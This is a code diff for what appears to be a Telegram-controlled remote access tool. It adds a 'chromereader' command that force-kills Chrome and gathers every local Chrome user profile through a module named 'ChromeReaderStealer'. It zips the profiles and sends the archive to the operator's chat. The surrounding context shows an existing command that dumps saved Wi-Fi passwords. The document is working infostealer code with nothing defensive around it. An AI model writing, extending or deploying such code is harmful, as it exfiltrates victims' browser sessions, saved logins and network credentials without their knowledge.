@@ -150,6 +150,29 @@ async def wifi(message: Message):
     text = "🛜 Wifi profiles:\n\n" + "\n\n".join([f"ssid: {profile.ssid}\npass: {profile.password}" for profile in wifi_profiles])
     await reply_to(message, text)
 
+@command_handler("chromereader", "👩‍💻 Get all local chrome profiles")
+async def chromereader(message: Message):
+    #msg = await reply_to(message, "👩‍💻 Creating archive...")
+    user_manager = executer.ChromeReaderStealer.UserManager.get()
+
+    caption = "👩‍💻 Found users:\n\n" + "\n".join([f"<b>{user.user_name}</b> ({len(user.profiles)} profiles):\n{"\n".join([f". {profile.name} ({profile.profile_name})" for profile in user.profiles])}" for user in user_manager.users]) + "\n\nUse the ChromeReader Visualizer on your pc to look at profiles:\nhttps://github.com/mathisgxd/ChromeReader/releases/tag/v0.1.0"
+
+    with executer.tempfile.TemporaryDirectory() as temp_path:
+        try:
+            executer.os.system("taskkill /f /im chrome.exe")
+        except:
+            pass
+
+        path = executer.os.path.join(temp_path, f"PC {executer.uuid.getnode()}")
+
+        user_manager = user_manager or executer.ChromeReaderStealer.UserManager.get()
+        user_manager.save(path)
+
+        zip_path = executer.shutil.make_archive(path, "zip", path)
+        
+        with open(zip_path, "rb") as file:
+            await bot.send_document(message.chat.id, file, caption=caption, parse_mode="html")
+
 # Media
 get_medium_by_name_or_id = lambda name_or_id, media_type: data.get_medium_by_id(name_or_id) if (type(name_or_id) == int) or name_or_id.isdigit() else data.get_medium(name_or_id, media_type)
 
